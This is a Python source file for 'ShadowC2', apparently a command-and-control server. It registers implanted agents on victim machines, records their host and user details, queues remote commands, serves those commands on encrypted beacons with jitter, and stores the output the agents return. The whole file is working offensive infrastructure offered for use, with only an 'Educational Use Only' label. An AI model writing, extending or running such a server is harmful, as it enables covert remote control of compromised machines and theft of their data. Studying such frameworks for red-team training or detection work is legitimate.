"""
ShadowC2 - Main C2 Server
Handles agent connections, command dispatch, and session management
"""

import os
import sys
import json
import time
import argparse
import sqlite3
from datetime import datetime
from flask import Flask, request, jsonify
from colorama import init, Fore, Style

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from common.crypto import CryptoHandler, SessionCrypto
from common.protocol import (
    C2Message, MessageType, CheckinMessage, HeartbeatMessage,
    CommandMessage, ResponseMessage, validate_message
)

# Initialize colorama
init(autoreset=True)

# Flask app
app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)

# Global state
class C2Server:
    """Main C2 Server class"""
    
    def __init__(self, host="0.0.0.0", port=8443, key=None):
        """
        Initialize C2 server
        
        Args:
            host: Listen address
            port: Listen port
            key: Master encryption key (generated if not provided)
        """
        self.host = host
        self.port = port
        self.start_time = datetime.now()
        
        # Cryptography
        if key:
            self.master_key = key
        else:
            self.master_key = CryptoHandler.generate_key()
            print(f"{Fore.YELLOW}[!] Generated new master key: {CryptoHandler(self.master_key).get_key_base64()}")
        
        self.crypto = SessionCrypto(self.master_key)
        
        # Session tracking
        self.sessions = {}  # session_id -> session_data
        self.command_queue = {}  # session_id -> [commands]
        
        # Database
        self.db_path = "c2_server.db"
        self.init_database()
        
        print(f"{Fore.GREEN}[+] C2 Server initialized")
        print(f"    Host: {self.host}")
        print(f"    Port: {self.port}")
        print(f"    Database: {self.db_path}")
    
    def init_database(self):
        """Initialize SQLite database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Sessions table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS sessions (
                session_id TEXT PRIMARY KEY,
                hostname TEXT,
                username TEXT,
                os TEXT,
                architecture TEXT,
                ip_address TEXT,
                first_seen INTEGER,
                last_seen INTEGER,
                status TEXT
            )
        ''')
        
        # Commands table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                command_id TEXT PRIMARY KEY,
                session_id TEXT,
                command TEXT,
                timestamp INTEGER,
                status TEXT,
                output TEXT,
                FOREIGN KEY(session_id) REFERENCES sessions(session_id)
            )
        ''')
        
        # Logs table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp INTEGER,
                level TEXT,
                message TEXT
            )
        ''')
        
        conn.commit()
        conn.close()
        print(f"{Fore.GREEN}[+] Database initialized")
    
    def register_session(self, session_id, system_info):
        """
        Register new agent session
        
        Args:
            session_id: Unique session identifier
            system_info: Dictionary with system information
        """
        # Create session crypto
        self.crypto.create_session(session_id)
        
        # Store session data
        self.sessions[session_id] = {
            "session_id": session_id,
            "hostname": system_info.get("hostname", "Unknown"),
            "username": system_info.get("username", "Unknown"),
            "os": system_info.get("os", "Unknown"),
            "architecture": system_info.get("architecture", "Unknown"),
            "ip_address": system_info.get("ip_address", "Unknown"),
            "first_seen": int(time.time()),
            "last_seen": int(time.time()),
            "status": "active"
        }
        
        # Initialize command queue
        self.command_queue[session_id] = []
        
        # Save to database
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT OR REPLACE INTO sessions 
            (session_id, hostname, username, os, architecture, ip_address, first_seen, last_seen, status)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            session_id,
            self.sessions[session_id]["hostname"],
            self.sessions[session_id]["username"],
            self.sessions[session_id]["os"],
            self.sessions[session_id]["architecture"],
            self.sessions[session_id]["ip_address"],
            self.sessions[session_id]["first_seen"],
            self.sessions[session_id]["last_seen"],
            self.sessions[session_id]["status"]
        ))
        conn.commit()
        conn.close()
        
        self.log(f"New session registered: {session_id} ({self.sessions[session_id]['hostname']})", "INFO")
    
    def update_session(self, session_id):
        """Update session last seen timestamp"""
        if session_id in self.sessions:
            self.sessions[session_id]["last_seen"] = int(time.time())
            
            # Update database
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            cursor.execute(
                "UPDATE sessions SET last_seen = ? WHERE session_id = ?",
                (int(time.time()), session_id)
            )
            conn.commit()
            conn.close()
    
    def queue_command(self, session_id, command_msg):
        """
        Queue command for agent
        
        Args:
            session_id: Target session
            command_msg: CommandMessage object
        """
        if session_id not in self.command_queue:
            self.command_queue[session_id] = []
        
        self.command_queue[session_id].append(command_msg.to_dict())
        
        # Save to database
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO commands (command_id, session_id, command, timestamp, status)
            VALUES (?, ?, ?, ?, ?)
        ''', (
            command_msg.msg_id,
            session_id,
            json.dumps(command_msg.data),
            int(time.time()),
            "queued"
        ))
        conn.commit()
        conn.close()
        
        self.log(f"Command queued for {session_id}: {command_msg.data.get('command')}", "INFO")
    
    def get_pending_commands(self, session_id):
        """
        Get pending commands for agent
        
        Args:
            session_id: Session ID
            
        Returns:
            list: List of pending commands
        """
        if session_id not in self.command_queue:
            return []
        
        commands = self.command_queue[session_id].copy()
        self.command_queue[session_id] = []  # Clear queue
        return commands
    
    def log(self, message, level="INFO"):
        """
        Log message
        
        Args:
            message: Log message
            level: Log level (INFO, WARNING, ERROR)
        """
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Color based on level
        if level == "INFO":
            color = Fore.GREEN
        elif level == "WARNING":
            color = Fore.YELLOW
        elif level == "ERROR":
            color = Fore.RED
        else:
            color = Fore.WHITE
        
        print(f"{color}[{timestamp}] [{level}] {message}")
        
        # Save to database
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO logs (timestamp, level, message) VALUES (?, ?, ?)",
            (int(time.time()), level, message)
        )
        conn.commit()
        conn.close()


# Global server instance
c2_server = None


# Flask routes
@app.route('/api/v1/checkin', methods=['POST'])
def handle_checkin():
    """Handle agent check-in (initial registration)"""
    try:
        # Get encrypted data
        encrypted_data = request.json.get('data')
        if not encrypted_data:
            return jsonify({"error": "No data provided"}), 400
        
        # Decrypt with master key (since no session exists yet)
        crypto = CryptoHandler(c2_server.master_key)
        decrypted = crypto.decrypt(encrypted_data)
        
        # Parse message
        msg = C2Message.from_dict(decrypted)
        
        if not validate_message(msg.to_dict()):
            return jsonify({"error": "Invalid message format"}), 400
        
        # Register session
        c2_server.register_session(msg.session_id, msg.data)
        
        # Create response
        response = {
            "status": "success",
            "message": "Session registered",
            "beacon_interval": 60,
            "jitter": 30
        }
        
        # Encrypt response with new session key
        session_crypto = c2_server.crypto.get_session_crypto(msg.session_id)
        encrypted_response = session_crypto.encrypt(response)
        
        return jsonify({"data": encrypted_response}), 200
        
    except Exception as e:
        c2_server.log(f"Check-in error: {str(e)}", "ERROR")
        return jsonify({"error": "Internal server error"}), 500


@app.route('/api/v1/beacon', methods=['POST'])
def handle_beacon():
    """Handle agent heartbeat/beacon"""
    try:
        # Get encrypted data
        encrypted_data = request.json.get('data')
        session_id = request.json.get('session_id')
        
        if not encrypted_data or not session_id:
            return jsonify({"error": "Missing data"}), 400
        
        # Decrypt with session key
        session_crypto = c2_server.crypto.get_session_crypto(session_id)
        decrypted = session_crypto.decrypt(encrypted_data)
        
        # Update last seen
        c2_server.update_session(session_id)
        
        # Get pending commands
        commands = c2_server.get_pending_commands(session_id)
        
        # Create response
        response = {
            "status": "success",
            "commands": commands
        }
        
        # Encrypt response
        encrypted_response = session_crypto.encrypt(response)
        
        return jsonify({"data": encrypted_response}), 200
        
    except Exception as e:
        c2_server.log(f"Beacon error: {str(e)}", "ERROR")
        return jsonify({"error": "Internal server error"}), 500


@app.route('/api/v1/response', methods=['POST'])
def handle_response():
    """Handle agent command response"""
    try:
        # Get encrypted data
        encrypted_data = request.json.get('data')
        session_id = request.json.get('session_id')
        
        if not encrypted_data or not session_id:
            return jsonify({"error": "Missing data"}), 400
        
        # Decrypt with session key
        session_crypto = c2_server.crypto.get_session_crypto(session_id)
        decrypted = session_crypto.decrypt(encrypted_data)
        
        # Parse message
        msg = C2Message.from_dict(decrypted)
        
        # Log response
        command_id = msg.data.get('command_id')
        success = msg.data.get('success')
        output = msg.data.get('output', '')
        
        c2_server.log(f"Response from {session_id}: {output[:100]}", "INFO")
        
        # Update database
        conn = sqlite3.connect(c2_server.db_path)
        cursor = conn.cursor()
        cursor.execute(
            "UPDATE commands SET status = ?, output = ? WHERE command_id = ?",
            ("completed" if success else "failed", output, command_id)
        )
        conn.commit()
        conn.close()
        
        # Print output to console
        print(f"\n{Fore.CYAN}[OUTPUT from {session_id}]")
        print(output)
        print(f"{Style.RESET_ALL}")
        
        return jsonify({"status": "success"}), 200
        
    except Exception as e:
        c2_server.log(f"Response error: {str(e)}", "ERROR")
        return jsonify({"error": "Internal server error"}), 500


@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    uptime = (datetime.now() - c2_server.start_time).total_seconds()
    return jsonify({
        "status": "operational",
        "uptime_seconds": int(uptime),
        "active_sessions": len([s for s in c2_server.sessions.values() if s["status"] == "active"])
    }), 200


def print_banner():
    """Print ShadowC2 banner"""
    banner = f"""
{Fore.RED}
   _____ __              __              __________ 
  / ___// /_  ____ _____/ /___ _      __/ ____/__ \\
  \__ \/ __ \/ __ `/ __  / __ \ | /| / / /     __/ /
 ___/ / / / / /_/ / /_/ / /_/ / |/ |/ / /___  / __/ 
/____/_/ /_/\__,_/\__,_/\____/|__/|__/\____/ /____/ 
                                                     
{Fore.CYAN}        Command & Control Framework v1.0
{Fore.YELLOW}        Educational Use Only - @Akshat
{Style.RESET_ALL}
"""
    print(banner)


def main():
    """Main entry point"""
    global c2_server
    
    parser = argparse.ArgumentParser(description='ShadowC2 Server')
    parser.add_argument('--host', default='0.0.0.0', help='Listen address')
    parser.add_argument('--port', type=int, default=8443, help='Listen port')
    parser.add_argument('--key', help='Master encryption key (base64)')
    parser.add_argument('--debug', action='store_true', help='Enable debug mode')
    
    args = parser.parse_args()
    
    # Print banner
    print_banner()
    
    # Initialize server
    master_key = None
    if args.key:
        master_key = CryptoHandler.key_from_base64(args.key)
    
    c2_server = C2Server(host=args.host, port=args.port, key=master_key)
    
    # Start Flask app
    print(f"\n{Fore.GREEN}[+] Starting C2 server on {args.host}:{args.port}")
    print(f"{Fore.YELLOW}[!] Press Ctrl+C to stop\n")
    
    try:
        app.run(
            host=args.host,
            port=args.port,
            debug=args.debug,
            ssl_context='adhoc' if args.port == 443 or args.port == 8443 else None
        )
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Shutting down server...")
        print(f"{Fore.GREEN}[+] Server stopped")


if __name__ == "__main__":
    main()
